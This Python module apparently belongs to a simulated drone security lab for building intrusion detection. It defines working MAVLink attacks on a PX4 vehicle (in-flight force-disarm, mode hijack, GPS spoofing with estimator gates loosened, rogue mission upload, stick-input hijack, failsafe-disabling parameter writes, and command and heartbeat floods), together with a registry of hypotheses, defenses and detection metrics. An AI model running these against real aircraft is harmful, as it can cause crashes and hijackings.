"""Attack suite + research taxonomy for the UAV Cyber Digital Twin lab.

Tier A = core publishable case studies (default pipeline).
Tier B = supporting multiclass / appendix scenarios.

Each attack carries P/N/T effect flags used by the case-study sheet and UI:
  P = Physical Twin (Gazebo/vehicle) effect
  N = Network / MAVLink signature
  T = Digital Twin observable divergence or control-plane symptom
"""

from __future__ import annotations

import os
import sys
import time

from pymavlink import mavutil

import config as C
from mav_common import MavLink, log


def _attacker() -> MavLink:
    return MavLink(sysid=C.ATTACKER_SYSID)


def _attacker_ready(m: MavLink, logf=log, name: str = "attack") -> None:
    """Short link settle — do not burn the whole attack window on heartbeat.

    Attacker sockets are udpout via the gateway and often never see a PX4
    heartbeat reply; a 2s wait meant proactive abort fired before any inject.
    """
    try:
        m.wait_heartbeat(timeout=0.25)
    except Exception:
        pass
    try:
        m.reclaim()
    except Exception:
        pass
    time.sleep(0.05)


def _ips_aborted(logf, name: str) -> bool:
    """Yield to active IPS or a dashboard Stop request."""
    try:
        from ids.defense import defense_should_abort
        if defense_should_abort():
            logf(name, "aborted — active IPS defense")
            return True
    except Exception:
        pass
    try:
        from mav_common import run_abort_requested
        if run_abort_requested():
            logf(name, "aborted — user stop")
            return True
    except Exception:
        pass
    return False


# ---------------------------------------------------------------- takeoff
def takeoff_injection(duration_s: float, logf=log):
    """Unauthorized arm + takeoff from a spoofed GCS."""
    m = _attacker()
    _attacker_ready(m)
    logf("takeoff_injection", "inject AUTO.TAKEOFF + force-arm")
    m.set_mode("AUTO_TAKEOFF")
    time.sleep(0.5)
    m.arm(force=True)
    time.sleep(duration_s)
    m.close()


# ---------------------------------------------------------------- disarm
def disarm_injection(duration_s: float, logf=log):
    """Force-disarm in flight -> motors cut -> crash."""
    m = _attacker()
    _attacker_ready(m)
    logf("disarm_injection", "inject force-DISARM (kill motors)")
    for _ in range(5):
        if _ips_aborted(logf, "disarm_injection"):
            break
        m.disarm(force=True)
        time.sleep(0.3)
    time.sleep(duration_s)
    m.close()


# ---------------------------------------------------------------- mode change
def mode_change_land(duration_s: float, logf=log):
    """Hijack flight mode to AUTO.LAND."""
    m = _attacker()
    _attacker_ready(m)
    logf("mode_change_land", "force AUTO.LAND")
    for _ in range(4):
        if _ips_aborted(logf, "mode_change_land"):
            break
        m.set_mode("AUTO_LAND")
        time.sleep(0.3)
    time.sleep(duration_s)
    m.close()


def mode_change_rtl(duration_s: float, logf=log):
    """Hijack flight mode to AUTO.RTL (return-to-launch)."""
    m = _attacker()
    _attacker_ready(m)
    logf("mode_change_rtl", "force AUTO.RTL")
    for _ in range(4):
        m.set_mode("AUTO_RTL")
        time.sleep(0.3)
    time.sleep(duration_s)
    m.close()


# ---------------------------------------------------------------- DoS flood
def command_flood_dos(duration_s: float, logf=log):
    """Flood COMMAND_LONG + heartbeats as fast as possible (DoS)."""
    m = _attacker()
    _attacker_ready(m)
    logf("command_flood_dos", f"flooding for {duration_s:.0f}s")
    t0 = time.time()
    n = 0
    while time.time() - t0 < duration_s:
        if _ips_aborted(logf, "command_flood_dos"):
            break
        m.conn.mav.command_long_send(
            C.PX4_SYSID, C.PX4_COMPID,
            mavutil.mavlink.MAV_CMD_REQUEST_MESSAGE, 0, 0, 0, 0, 0, 0, 0, 0)
        m.conn.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                                  mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        n += 1
    logf("command_flood_dos", f"sent ~{n*2} packets")
    m.close()


# ---------------------------------------------------------------- GPS spoof
def _read_live_geo(timeout: float = 2.0) -> tuple[float, float, float, float, float, float]:
    """Return (lat, lon, alt_m, vn, ve, vd) from live telemetry if available."""
    # Prefer recorder-fed state (works while 14550 is busy during a run).
    try:
        from mav_common import vehicle_geo
        g = vehicle_geo()
        if g.get("lat") is not None and g.get("lon") is not None:
            lat_raw, lon_raw = float(g["lat"]), float(g["lon"])
            # Physical recorder stores GLOBAL_POSITION_INT ints (deg*1e7).
            if abs(lat_raw) > 360:
                lat, lon = lat_raw / 1e7, lon_raw / 1e7
            else:
                lat, lon = lat_raw, lon_raw
            alt_raw = g.get("alt_msl")
            if alt_raw is None:
                alt = 488.0
            else:
                alt = float(alt_raw) / 1000.0 if float(alt_raw) > 10000 else float(alt_raw)
            vn = float(g["vx"] or 0.0)
            ve = float(g["vy"] or 0.0)
            vd = float(g["vz"] or 0.0)
            # If only local NED is known, synthesize lat/lon from SITL home + NED.
            if abs(lat) < 1e-6 and g.get("x") is not None:
                home_lat, home_lon = 47.397742, 8.545594
                lat = home_lat + float(g["x"]) / 111320.0
                lon = home_lon + float(g["y"]) / (111320.0 * max(0.2, abs(__import__("math").cos(__import__("math").radians(home_lat)))))
            return lat, lon, alt, vn, ve, vd
    except Exception:
        pass
    # Fallback Zurich SITL home
    return 47.397742, 8.545594, 488.0, 0.0, 0.0, 0.0



def _disable_sim_gps(logf) -> None:
    """Best-effort: turn off Gazebo/Sim GPS so GPS_INPUT can dominate EKF."""
    m = None
    try:
        m = MavLink(sysid=getattr(C, "GCS_SYSID", 255))
        m.wait_heartbeat(timeout=1.5)
        # MAV_CMD_INJECT_FAILURE (4205 in some builds; 184 legacy) — try both.
        for cmd in (4205, 184):
            try:
                # unit=GPS (5), type=OFF (0), instance=0
                m.conn.mav.command_long_send(
                    C.PX4_SYSID, C.PX4_COMPID, cmd, 0,
                    5, 0, 0, 0, 0, 0, 0)
            except Exception:
                pass
        # Also ask EKF to trust GPS less tightly so injected bias is fused.
        for name, val in (("EKF2_GPS_V_GATE", 5.0), ("EKF2_GPS_P_GATE", 5.0)):
            try:
                m.conn.mav.param_set_send(
                    C.PX4_SYSID, C.PX4_COMPID, name.encode(), float(val),
                    mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
            except Exception:
                pass
        logf("gps_spoofing", "sim-GPS degrade attempted (failure inject + gates)")
    except Exception as exc:  # noqa: BLE001
        logf("gps_spoofing", f"sim-GPS degrade skipped: {exc}")
    finally:
        if m is not None:
            try:
                m.close()
            except Exception:
                pass


def _gps_input_has_yaw(conn) -> bool:
    """True if this link's GPS_INPUT message defines the v2-only ``yaw`` field.

    The gateway can flip pymavlink's active dialect between MAVLink v1 (18
    fields, no yaw) and v2 (19 fields, yaw). We inspect the connection's own
    encoder module rather than the process-global ``mavutil.mavlink`` so the arg
    count always matches the packet actually being built.
    """
    try:
        mod = sys.modules[conn.mav.__class__.__module__]
        return "yaw" in mod.MAVLink_gps_input_message.fieldnames
    except Exception:
        return True  # assume modern v2 if introspection fails


def gps_spoofing(duration_s: float, logf=log):
    """Inject drifting GPS_INPUT seeded from the live vehicle pose.

    Starts near the true estimate (so EKF accepts), then walks lat/lon away so
    horizontal navigation is pulled. Optionally degrades Sim GPS first.
    """
    m = _attacker()
    _attacker_ready(m)
    drift_rate = float(os.environ.get("GPS_SPOOF_DRIFT",
                                      str(getattr(C, "GPS_SPOOF_DRIFT", 3e-5))))
    base_lat, base_lon, alt, vn0, ve0, vd0 = _read_live_geo()
    _disable_sim_gps(logf)
    logf("gps_spoofing",
         f"injecting GPS_INPUT from live pose "
         f"({base_lat:.6f},{base_lon:.6f}) drift={drift_rate:g} deg/s")
    t0 = time.time()
    k = 0
    # ~1.1 m per 1e-5 deg; default 3e-5 ≈ 3+ m/s horizontal walk
    while time.time() - t0 < duration_s:
        if _ips_aborted(logf, "gps_spoofing"):
            break
        elapsed = time.time() - t0
        drift = elapsed * drift_rate
        # Velocity consistent with the walk (north+east), keeps EKF from rejecting.
        # 1 deg lat ≈ 111320 m → deg/s * 111320 ≈ m/s
        v_walk = drift_rate * 111320.0
        vn = vn0 + v_walk
        ve = ve0 + v_walk
        vd = vd0
        # GPS_INPUT has a trailing `yaw` field in MAVLink v2 (19 fields) but NOT
        # in v1 (18 fields). Starting the proactive gateway flips pymavlink's
        # global dialect to v1, so a fixed 19-arg call — and the old "fallback"
        # that still passed yaw — raised "required argument is not an integer"
        # and every injected packet was silently dropped (sent 0). Build the
        # 18 shared args and append yaw only when this link's message defines it.
        gps_args = [
            int(time.time() * 1e6),           # time_usec
            0,                                # gps_id (compete as GPS0 / primary)
            0,                                # ignore_flags (keep lat/lon/alt/vel)
            0, 0,                             # time_week_ms, time_week
            3,                                # fix_type 3D
            int((base_lat + drift) * 1e7),
            int((base_lon + drift) * 1e7),
            float(alt),
            0.5, 0.5,                         # hdop vdop (good)
            float(vn), float(ve), float(vd),
            0.4, 0.4, 0.6,                    # accuracies
            12,                               # satellites_visible
        ]
        if _gps_input_has_yaw(m.conn):
            gps_args.append(0)                # yaw (v2 only), int (uint16)
        try:
            m.conn.mav.gps_input_send(*gps_args)
        except Exception as exc:  # noqa: BLE001
            logf("gps_spoofing", f"gps_input unsupported: {exc}")
            break
        k += 1
        time.sleep(0.05)  # 20 Hz — stronger than Sim GPS cadence for fusion
    logf("gps_spoofing", f"sent {k} GPS_INPUT msgs")
    m.close()


# ---------------------------------------------------------------- mission inject
def mission_injection(duration_s: float, logf=log):
    """Upload a malicious mission and switch to AUTO.MISSION."""
    m = _attacker()
    _attacker_ready(m)
    logf("mission_injection", "uploading rogue mission")
    wps = [
        (47.399, 8.5456, 20.0),
        (47.401, 8.5480, 30.0),
        (47.405, 8.5520, 25.0),
    ]
    m.conn.mav.mission_count_send(C.PX4_SYSID, C.PX4_COMPID, len(wps), 0)
    t0 = time.time()
    sent = set()
    while time.time() - t0 < 6:
        req = m.conn.recv_match(type=["MISSION_REQUEST", "MISSION_REQUEST_INT",
                                      "MISSION_ACK"], blocking=True, timeout=0.5)
        if req is None:
            continue
        if req.get_type() == "MISSION_ACK":
            break
        seq = req.seq
        lat, lon, alt = wps[min(seq, len(wps) - 1)]
        m.conn.mav.mission_item_int_send(
            C.PX4_SYSID, C.PX4_COMPID, seq,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
            mavutil.mavlink.MAV_CMD_NAV_WAYPOINT, 0, 1, 0, 5, 0, float("nan"),
            int(lat * 1e7), int(lon * 1e7), alt, 0)
        sent.add(seq)
    m.set_mode("AUTO_MISSION")
    m.arm(force=True)
    time.sleep(max(0.0, duration_s - 6.0))
    m.close()


# ---------------------------------------------------------------- RC override
def rc_override(duration_s: float, logf=log):
    """Hijack the sticks via MANUAL_CONTROL injection."""
    m = _attacker()
    _attacker_ready(m)
    logf("rc_override", "injecting MANUAL_CONTROL (stick hijack)")
    t0 = time.time()
    k = 0
    while time.time() - t0 < duration_s:
        if _ips_aborted(logf, "rc_override"):
            break
        # x,y,z,r in [-1000,1000]; push pitch/roll hard, low throttle
        m.conn.mav.manual_control_send(C.PX4_SYSID, 800, -800, 200, 500, 0)
        k += 1
        time.sleep(0.05)
    logf("rc_override", f"sent {k} MANUAL_CONTROL msgs")
    m.close()


# ---------------------------------------------------------------- params
def param_injection(duration_s: float, logf=log):
    """Tamper with safety-critical parameters via PARAM_SET."""
    m = _attacker()
    _attacker_ready(m)
    logf("param_injection", "injecting malicious PARAM_SET")
    targets = [
        ("COM_DISARM_LAND", 0.0),   # never auto-disarm on land
        ("COM_RCL_EXCEPT", 4.0),    # ignore RC loss
        ("NAV_RCL_ACT", 0.0),       # disable RC-loss failsafe
    ]
    for name, val in targets:
        try:
            m.conn.mav.param_set_send(
                C.PX4_SYSID, C.PX4_COMPID, name.encode(), val,
                mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
            logf("param_injection", f"PARAM_SET {name}={val}")
            time.sleep(0.4)
        except Exception as exc:  # noqa: BLE001
            logf("param_injection", f"{name} failed: {exc}")
    time.sleep(max(0.0, duration_s - 1.5))
    m.close()


# ---------------------------------------------------------------- heartbeat
def heartbeat_spoof(duration_s: float, logf=log):
    """Flood conflicting GCS heartbeats from many system IDs."""
    m = _attacker()
    _attacker_ready(m)
    logf("heartbeat_spoof", "flooding spoofed GCS heartbeats")
    t0 = time.time()
    k = 0
    while time.time() - t0 < duration_s:
        if _ips_aborted(logf, "heartbeat_spoof"):
            break
        for sysid in (250, 251, 252, 253, 255):
            m.conn.mav.srcSystem = sysid
            m.conn.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                                      mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
            k += 1
        time.sleep(0.02)
    logf("heartbeat_spoof", f"sent {k} spoofed heartbeats")
    m.close()


# ---------------------------------------------------------------- research registry
# Ordered: Tier A core first, then Tier B support.
ATTACKS = {
    "gps_spoofing": {
        "fn": gps_spoofing, "needs_airborne": True,
        "tier": "A", "order": 10,
        "title": "GPS Spoofing", "category": "Sensor Spoofing",
        "desc": "Inject drifting GPS_INPUT mid-mission to bias the estimator.",
        "effect": "Estimated position drifts away from the true PT path.",
        "hypothesis": "Cyber GPS injection produces measurable PT path error "
                      "that the CDT mirrors, enabling residual-based detection.",
        "effects": {"P": True, "N": True, "T": True},
        "defense": "GPS integrity / EKF gates / sensor fusion",
        "metrics": ["path_error_m", "dt_pt_residual_m", "alt_err", "msg_gps_input_rate"],
    },
    "disarm_injection": {
        "fn": disarm_injection, "needs_airborne": True,
        "tier": "A", "order": 20,
        "title": "Disarm Injection", "category": "Command Injection",
        "desc": "Force-disarm mid-flight; motors cut out.",
        "effect": "Motors stop; vehicle falls — immediate safety violation.",
        "hypothesis": "Unauthorized ARM/DISARM is visible as a hard safety "
                      "event on both PT dynamics and DT armed/alt feeds.",
        "effects": {"P": True, "N": True, "T": True},
        "defense": "Arming auth + command allow-list",
        "metrics": ["armed_transition", "alt_drop_rate", "cmd_arm_rate"],
    },
    "mode_change_land": {
        "fn": mode_change_land, "needs_airborne": True,
        "tier": "A", "order": 30,
        "title": "Mode Change — Land", "category": "Mode Hijack",
        "desc": "Hijack flight mode to AUTO.LAND mid shared plan.",
        "effect": "Vehicle abandons the shared plan and descends.",
        "hypothesis": "Mode FSM violations break the shared mission; "
                      "DT mode+trail diverge from the planned route.",
        "effects": {"P": True, "N": True, "T": True},
        "defense": "Mode-transition policy / FSM monitor",
        "metrics": ["mode_change_count", "path_abort", "time_to_land"],
    },
    "mission_injection": {
        "fn": mission_injection, "needs_airborne": False,
        "tier": "A", "order": 40,
        "title": "Mission Injection", "category": "Command Injection",
        "desc": "Upload a rogue waypoint set and switch to AUTO.MISSION.",
        "effect": "Vehicle follows an attacker-defined route.",
        "hypothesis": "Mission integrity failure is detectable as DT/PT "
                      "trajectory mismatch vs the known shared plan.",
        "effects": {"P": True, "N": True, "T": True},
        "defense": "Mission signing / WP validation",
        "metrics": ["wp_set_events", "route_deviation_m", "mode_mission"],
    },
    "command_flood_dos": {
        "fn": command_flood_dos, "needs_airborne": False,
        "tier": "A", "order": 50,
        "title": "Command Flood (DoS)", "category": "Denial of Service",
        "desc": "Saturate COMMAND_LONG + heartbeats on the GCS link.",
        "effect": "Link saturates; rates spike; control may lag.",
        "hypothesis": "Availability attacks show N-layer explosions and "
                      "possible DT lag even when PT kinematics stay soft.",
        "effects": {"P": False, "N": True, "T": True},
        "defense": "Rate limits / QoS / backpressure",
        "metrics": ["pkt_rate", "mav_cmd_rate", "dt_update_jitter"],
    },
    "rc_override": {
        "fn": rc_override, "needs_airborne": True,
        "tier": "A", "order": 60,
        "title": "RC Override", "category": "Control Hijack",
        "desc": "Hijack sticks via MANUAL_CONTROL mid-mission.",
        "effect": "Attacker stick inputs divert the shared plan.",
        "hypothesis": "Control-plane hijack causes abrupt attitude/speed "
                      "anomalies visible on DT and PT.",
        "effects": {"P": True, "N": True, "T": True},
        "defense": "RC source authentication / control arbiter",
        "metrics": ["manual_control_rate", "tilt_spike", "path_deviation"],
    },
    "param_injection": {
        "fn": param_injection, "needs_airborne": False,
        "tier": "A", "order": 70,
        "title": "Parameter Injection", "category": "Configuration Tamper",
        "desc": "Tamper with failsafe-related parameters via PARAM_SET.",
        "effect": "Safety config silently weakened (often delayed P-effect).",
        "hypothesis": "Config integrity attacks may be N-visible first; "
                      "P/T effects appear when a later fault is exercised.",
        "effects": {"P": False, "N": True, "T": False},
        "defense": "Param allow-list / signed config",
        "metrics": ["param_set_rate", "param_name_entropy"],
    },
    # ----- Tier B (supporting) -----
    "mode_change_rtl": {
        "fn": mode_change_rtl, "needs_airborne": True,
        "tier": "B", "order": 80,
        "title": "Mode Change — RTL", "category": "Mode Hijack",
        "desc": "Hijack flight mode to AUTO.RTL (return to launch).",
        "effect": "Vehicle breaks off and returns toward home.",
        "hypothesis": "Variant of mode hijack for multiclass separation.",
        "effects": {"P": True, "N": True, "T": True},
        "defense": "Mode-transition policy / FSM monitor",
        "metrics": ["mode_change_count", "rtl_trigger", "path_abort"],
    },
    "heartbeat_spoof": {
        "fn": heartbeat_spoof, "needs_airborne": False,
        "tier": "B", "order": 90,
        "title": "Heartbeat Spoof", "category": "Identity Spoofing",
        "desc": "Flood conflicting GCS heartbeats from many system IDs.",
        "effect": "GCS identity confusion; strong N, often weak P.",
        "hypothesis": "Identity attacks train network/IDS models where "
                      "physical impact is minimal — triangulation case.",
        "effects": {"P": False, "N": True, "T": False},
        "defense": "GCS identity binding / sysid allow-list",
        "metrics": ["unique_sysids", "hb_rate", "sysid_entropy"],
    },
    "takeoff_injection": {
        "fn": takeoff_injection, "needs_airborne": False,
        "tier": "B", "order": 100,
        "title": "Takeoff Injection", "category": "Command Injection",
        "desc": "Unauthorized arm + AUTO.TAKEOFF from a spoofed GCS.",
        "effect": "Vehicle arms and lifts off without operator intent.",
        "hypothesis": "Pre-flight phase attack for phase-aware labeling.",
        "effects": {"P": True, "N": True, "T": True},
        "defense": "Arming auth + command allow-list",
        "metrics": ["armed_transition", "takeoff_cmd", "alt_rise"],
    },
}


def core_attack_ids() -> list[str]:
    """Tier A attack IDs in display/pipeline order."""
    return [k for k, v in sorted(ATTACKS.items(), key=lambda kv: kv[1].get("order", 999))
            if v.get("tier") == "A"]


def support_attack_ids() -> list[str]:
    return [k for k, v in sorted(ATTACKS.items(), key=lambda kv: kv[1].get("order", 999))
            if v.get("tier") == "B"]


def pipeline_scenario_ids(scope: str = "core") -> list[str]:
    """Scenario list for pipelines: core | all | attacks | benign."""
    if scope == "benign":
        return ["benign"]
    if scope == "attacks":
        return core_attack_ids()
    if scope == "all":
        return ["benign"] + core_attack_ids() + support_attack_ids()
    # default: research core (benign + Tier A)
    return ["benign"] + core_attack_ids()


BENIGN_META = {
    "id": "benign", "title": "Benign Shared Mission", "category": "Normal",
    "tier": "A", "order": 0, "is_attack": False, "needs_airborne": False,
    "desc": "Legitimate multi-waypoint OFFBOARD flight on the shared plan "
            "(negative class; pre/post windows also labeled benign).",
    "effect": "Normal operation — DT tracks PT on the shared route.",
    "hypothesis": "Baseline cyber–physical fingerprints with zero attack window.",
    "effects": {"P": True, "N": True, "T": True},
    "defense": "N/A (baseline)",
    "metrics": ["path_rmse", "alt_stability", "pkt_baseline"],
}
